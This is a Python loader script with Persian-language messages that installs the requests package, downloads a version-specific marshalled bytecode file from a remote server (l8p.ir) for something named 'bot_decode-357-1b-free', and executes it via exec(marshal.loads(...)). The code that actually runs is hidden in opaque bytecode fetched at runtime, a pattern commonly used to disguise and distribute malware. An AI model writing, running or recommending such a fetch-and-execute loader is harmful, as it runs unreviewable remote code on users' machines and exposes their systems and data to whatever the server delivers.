import marshal, sys, os, subprocess, importlib.util

# BASE_PATH = '../..' 
BASE_PATH = 'https://l8p.ir/encoded_files'

file_name_without_ext = 'bot_decode-357-1b-free'

def install_package(package):
    if importlib.util.find_spec(package) is None:
        print(f"installing {package} ...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"{package} با موفقیت نصب شد.")
        except subprocess.CalledProcessError as e:
            print(f"error {package}: {e}")
            sys.exit(1)

install_package("requests")

import requests

current_version = f"{sys.version_info.major}.{sys.version_info.minor}"
print(f"نسخه پایتون: {current_version} ({sys.version})")

version_label = f"{sys.version_info.major}.{sys.version_info.minor}"

if BASE_PATH.startswith('http'):
    file_url = f"{BASE_PATH}/{file_name_without_ext}/{file_name_without_ext}_{version_label}.dat"
    print(f"file_url : {file_url}")
    try:
        response = requests.get(file_url, stream=True)
        if response.status_code != 200:
            print(f"خطا در دانلود فایل: کد وضعیت {response.status_code}")
            sys.exit(1)
        file_content = response.content
    except requests.RequestException as e:
        print(f"خطا در دانلود فایل: {e}")
        sys.exit(1)
else:
    file_path = os.path.join(BASE_PATH, file_name_without_ext, f"{file_name_without_ext}_{version_label}.dat")
    print(f"file_path : {file_path}")
    if not os.path.exists(file_path):
        print(f"خطا: فایل {file_path} یافت نشد.")
        sys.exit(1)
    with open(file_path, 'rb') as f:file_content = f.read()

exec(marshal.loads(file_content))
